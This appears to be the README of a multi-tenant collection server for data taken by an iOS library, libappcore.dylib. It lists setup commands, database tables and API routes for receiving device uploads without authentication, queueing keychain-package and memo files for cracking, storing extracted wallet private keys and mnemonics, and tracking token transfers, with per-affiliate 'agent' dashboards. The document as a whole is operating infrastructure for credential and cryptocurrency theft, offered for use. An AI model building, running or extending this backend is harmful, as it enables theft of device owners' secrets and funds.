# libappcore 多租户远程接收服务器

核心服务端 + 代理后台，基于逆向出的 SimpleUploader 协议重建。

## 架构

```
设备端 libappcore.dylib
       ↓ POST /upload/<type> (X-OS-Version, X-Bundle-ID, acquisition-id)
┌─────────────────────────────────────┐
│  核心服务端 (appcore_server.py)      │
│  - 全量数据存储 (SQLite)             │
│  - 破解队列管理                      │
│  - 用户/渠道/权限管理                │
│  - JWT 认证                          │
└─────────────────────────────────────┘
       ↓ 按渠道隔离数据
┌─────────────────────────────────────┐
│  代理后台 (admin-web/index.html)     │
│  - 管理员: 全量数据+系统管理         │
│  - 代理: 仅自己渠道的设备/数据       │
└─────────────────────────────────────┘
```

## 快速启动

```bash
pip install -r requirements.txt
python appcore_server.py -p 8080
```

访问 `http://localhost:8080/` 打开后台。

默认账号: `admin` / `admin123`（首次启动自动创建）

## 文件结构

```
server/
├── appcore_server.py    # 主服务器（Flask，多租户 API）
├── database.py          # SQLite 数据模型（8张表）
├── auth.py              # JWT 认证 + 权限装饰器
├── requirements.txt     # Python 依赖
├── admin-web/
│   └── index.html       # 代理后台前端（Vue3 + Element Plus，单文件）
└── README.md
```

## 数据库表

| 表 | 说明 |
|----|------|
| users | 用户（admin/agent） |
| channels | 渠道（平台号+管道号） |
| devices | 设备（uid, os, ip, 归属渠道） |
| files | 上传文件（类型, 破解状态） |
| crack_queue | 破解队列 |
| private_keys | 私钥信息 |
| token_transfers | 代币转账记录 |
| audit_logs | 操作日志 |

## API 接口

### 设备上传（无需认证，兼容 SimpleUploader）

```
POST /upload/<type>
Headers: X-OS-Version, X-Bundle-ID, acquisition-id, X-Device-UID, X-Channel-ID
Body: 二进制数据
```

### 认证

```
POST /api/auth/login          {"username","password"} → {"token","user"}
POST /api/auth/logout
GET  /api/auth/me
```

### 设备与统计（登录后，按渠道过滤）

```
GET /api/devices              ?keyword=&os_version=&channel_id=&start_date=&end_date=
GET /api/devices/<id>
GET /api/devices/<id>/files
GET /api/stats
GET /api/stats/ios-files      # iOS文件统计汇总
```

### 破解队列

```
GET  /api/crack-queue         ?status=pending|processing|done|failed
POST /api/crack-queue/<file_id>/process   (管理员) {"status","result"}
```

### 私钥与代币

```
GET /api/private-keys
GET /api/token-transfers      ?chain=ETH|BTC|...
```

### 管理员专属

```
GET/POST /api/admin/users
GET/POST /api/admin/channels
GET      /api/admin/audit-logs
```

### 文件下载

```
GET /api/files/<file_id>/download
```

## 权限模型

| 角色 | 可见数据 | 可操作 |
|------|----------|--------|
| admin | 全部渠道全部设备 | 用户管理、渠道管理、破解标记、系统设定 |
| agent | 仅自己渠道的设备和数据 | 查看统计、下载文件、查看私钥/代币 |

## 后台页面

- **首页** — 总览仪表盘（设备数/文件数/待破解/已破解/私钥数）
- **iOS文件统计** — 复刻原始后台：设备uid、系统版本、鑰包文件數量、鑰包待破解數量、備忘錄文件數量、備忘錄待破解數量、ip、首次時間、更新時間
- **渠道设备明细** — 设备列表+渠道归属
- **私鑰信息** — 提取的钱包私钥/助记词
- **代幣轉賬記錄** — 链上转账追踪
- **破解隊列** — 待破解任务管理
- **xgd運營統計報表** — 按渠道汇总
- **用戶管理** (admin) — 增删用户
- **渠道管理** (admin) — 增删渠道
- **操作日誌** (admin) — 审计日志
- **設定** (admin) — 系统配置

## 环境变量

| 变量 | 默认 | 说明 |
|------|------|------|
| UPLOAD_DIR | ./uploads | 上传文件存储目录 |
| DB_PATH | ./appcore.db | SQLite 数据库路径 |
| MAX_CONTENT_LENGTH | 524288000 | 最大上传大小 (500MB) |
| JWT_SECRET | (内置) | JWT 签名密钥（生产环境必须修改） |
| JWT_EXPIRE | 86400 | Token 过期时间（秒） |
